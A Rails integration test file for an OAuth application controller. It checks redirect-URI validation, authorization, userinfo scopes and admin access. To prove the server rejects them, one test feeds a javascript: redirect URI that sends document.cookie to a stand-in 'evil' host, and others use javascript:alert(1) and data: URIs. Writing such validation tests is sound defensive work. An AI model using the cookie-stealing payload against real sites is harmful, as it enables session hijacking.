require "test_helper"

class OauthControllerTest < ActionDispatch::IntegrationTest
  setup do
    @dev = User.create!(handle: "dev-#{SecureRandom.hex(3)}")
    @auth = { "Authorization" => "Bearer #{@dev.gen_auth_token}" }
  end

  def body = JSON.parse(@response.body)

  test "创建应用：默认上线，多个回调地址" do
    post "/oauth/applications", params: {
      name: "demo", redirect_uris: [ "https://a.example/cb", "http://localhost:4000/callback" ], allowed_scopes: [ "openid" ]
    }, headers: @auth, as: :json
    assert_response :created, @response.body
    assert_equal "active", body["application"]["status"]
    assert_equal [ "https://a.example/cb", "http://localhost:4000/callback" ], body["application"]["redirect_uris"]
  end

  test "创建或修改时拒绝 javascript: 回调，返回 400 和原因" do
    post "/oauth/applications", params: {
      name: "evil", redirect_uris: [ "javascript:fetch('//evil/?'+document.cookie)//" ], allowed_scopes: [ "openid" ]
    }, headers: @auth, as: :json
    assert_response :bad_request
    assert_equal "invalid_application", body["code"]
    assert_match "https://", body["message"]

    app, = OauthApplication.create_with_secret(name: "ok", owner: @dev, redirect_uris: [ "https://a.example/cb" ])
    patch "/oauth/applications/#{app.id}", params: { redirect_uris: [ "https://a.example/cb", "data:text/html,x" ] }, headers: @auth, as: :json
    assert_response :bad_request
    assert_equal [ "https://a.example/cb" ], app.reload.redirect_uris
  end

  test "授权页拒绝校验上线前存进去的非法回调" do
    app, = OauthApplication.create_with_secret(name: "old", owner: @dev, redirect_uris: [ "https://a.example/cb" ], allowed_scopes: [ "openid" ])
    app.update_column(:redirect_uris, [ "javascript:alert(1)" ])
    params = { client_id: app.client_id, redirect_uri: "javascript:alert(1)", response_type: "code",
               scope: "openid", code_challenge: "x", code_challenge_method: "S256" }

    get "/oauth/authorize", params: params
    assert_response :bad_request
    assert_equal "redirect_uri not registered", body["message"]

    post "/oauth/authorize", params: params.merge(action_choice: "deny"), headers: @auth, as: :json
    assert_response :bad_request
  end

  test "profile userinfo 返回已验证的邮箱和手机号" do
    user = User.create!(
      handle: "alice-link",
      email: "Alice@Example.com",
      phone: "13800000021",
      phone_verified: false
    )
    app, = OauthApplication.create_with_secret(
      name: "xjdao", owner: @dev,
      redirect_uris: [ "https://xjdao.xyz/callback" ],
      allowed_scopes: %w[openid profile wallet]
    )
    token = OauthAccessToken.issue(user: user, application: app, scopes: %w[openid profile wallet])

    get "/oauth/userinfo", headers: { "Authorization" => "Bearer #{token.token}" }

    assert_response :success
    assert_equal user.id, body["sub"]
    assert_equal "alice-link", body["handle"]
    assert_equal "Alice@Example.com", body["email"]
    assert_equal true, body["email_verified"]
    assert_equal "13800000021", body["phone"]
    assert_equal true, body["phone_verified"]
    assert_nil body["wallet_address"]
  end

  test "没有 profile scope 时不返回邮箱和手机号" do
    user = User.create!(email: "hidden@example.com", phone: "13800000022", phone_verified: true)
    app, = OauthApplication.create_with_secret(
      name: "bare", owner: @dev,
      redirect_uris: [ "https://a.example/cb" ],
      allowed_scopes: [ "openid" ]
    )
    token = OauthAccessToken.issue(user: user, application: app, scopes: [ "openid" ])

    get "/oauth/userinfo", headers: { "Authorization" => "Bearer #{token.token}" }

    assert_response :success
    assert_equal user.id, body["sub"]
    assert_nil body["email"]
    assert_nil body["phone"]
    assert_nil body["email_verified"]
    assert_nil body["phone_verified"]
  end

  test "admin application list requires an admin" do
    get "/oauth/admin/applications"
    assert_response :unauthorized

    user = User.create!(phone: "13800000020")
    token = user.gen_auth_token
    get "/oauth/admin/applications", headers: { "Authorization" => "Bearer #{token}" }
    assert_equal "forbidden", JSON.parse(@response.body)["code"]

    ENV["ADMIN_USER_IDS"] = "someone-else, #{user.id}"
    get "/oauth/admin/applications", headers: { "Authorization" => "Bearer #{token}" }
    assert_response :success
  ensure
    ENV.delete("ADMIN_USER_IDS")
  end
end
